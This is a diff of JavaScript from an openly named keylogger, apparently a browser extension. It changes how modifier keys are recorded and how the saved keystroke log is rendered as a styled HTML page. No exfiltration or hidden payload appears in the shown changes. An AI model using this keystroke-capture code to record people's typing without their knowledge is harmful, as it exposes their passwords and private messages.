@@ -26,11 +26,11 @@ keylog.logKeypress=function(e) {
 
 	var data = '';
 	if( e.shiftKey )
-		data += 'shift+';
+		data += 'shift';
 	if( e.altKey )
-		data += 'alt+';
+		data += 'alt';
 	if( e.ctrlKey )
-		data += 'ctrl+';
+		data += 'ctrl';
 	if(data)
 		data += '|';
 
@@ -97,7 +97,19 @@ keylog.present_log=function() {
 	var str= sInputStream.read(sInputStream.available());
 
 	//writing the log file to a designed HTML file
-	var tmp_str='<!DOCTYPE html><html><head><meta charset="utf-8"><style>span {border:1px solid #bbb;border-radius:3px;letter-spacing:-1px;margin-right:1px;padding:0 2px;} span span {border:none;padding:0;margin:0}</style></head><body style="font-family:monospace;line-height:20px;font-size:13px">' + "\n";
+	var tmp_str='<!DOCTYPE html><html><head><meta charset="utf-8">'
+	+'<style>'
+	+'i {font-style:normal;border:1px solid #bbb;border-radius:3px;letter-spacing:-1px;margin-right:1px;padding:0 2px;} '
+	+'i i {border:none;padding:0;margin:0} '
+	+'i[bs]:after {color:red;content:"BS"} '
+	+'i[tab]:after {color:gray;content:"tab"} '
+	+'i[shift] {color:green;} '
+	+'i[shift]:before {color:gray;content:"shift+"} '
+	+'i[alt] {color:green;} '
+	+'i[alt]:before {color:gray;content:"alt+"} '
+	+'i[ctrl] {color:green;} '
+	+'i[ctrl]:before {color:gray;content:"ctrl+"} '
+	+'</style></head><body style="font-family:monospace;line-height:20px;font-size:13px">' + "\n";
 
 	for(var y=0, begin_segment=0, len=String(str).length, charrr='', charrrAfter=''; y<len; y++)
 	{
@@ -107,17 +119,17 @@ keylog.present_log=function() {
 	  charrr = str.substring(begin_segment,y);
 	  if(!isNumber(charrr))
 	  {
-		tmp_str+='<span style="color:green">' + charrr;
-		charrrAfter='</span>';
+		tmp_str+='<i '+charrr+'>';
+		charrrAfter='</i>';
 	  }
 	  else
 	  {
 		  if(charrr == 13)
 			tmp_str+="<br>\n";
 		  else if(charrr == 8)
-			tmp_str+='<span style="color:red">BS</span>';
+			tmp_str+='<i bs></i>';
 		  else if(charrr == 0)
-			tmp_str+='<span style="color:gray">tab</span>';
+			tmp_str+='<i tab></i>';
 		  else
 			tmp_str+='&#' + charrr + ';';
 
